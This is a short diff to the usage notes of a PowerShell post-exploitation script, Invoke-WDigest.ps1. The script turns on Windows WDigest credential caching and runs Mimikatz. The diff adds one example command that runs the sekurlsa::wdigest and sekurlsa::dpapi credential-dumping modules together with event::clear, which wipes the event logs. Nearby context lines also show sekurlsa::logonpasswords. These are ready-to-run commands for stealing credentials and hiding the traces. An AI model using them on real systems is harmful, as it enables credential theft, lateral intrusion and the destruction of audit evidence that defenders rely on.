@@ -40,6 +40,9 @@ Get-Help .\Invoke-WDigest.ps1 -full
 # Ativate WDigest caching + Execute Mimikatz 'net::group sekurlsa::wdigest sekurlsa::logonpasswords' multiple dump modules.
 .\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'net::group sekurlsa::wdigest sekurlsa::logonpasswords sekurlsa::dpapi'
 
+# Execute Mimikatz (multiple dump::modules) without WDigest caching
+.\Invoke-WDigest.ps1 -wdigest 'false' -manycats -module 'net::group sekurlsa::wdigest sekurlsa::dpapi event::clear exit'
+
 
 [FAST DEMONSTRATION]
 
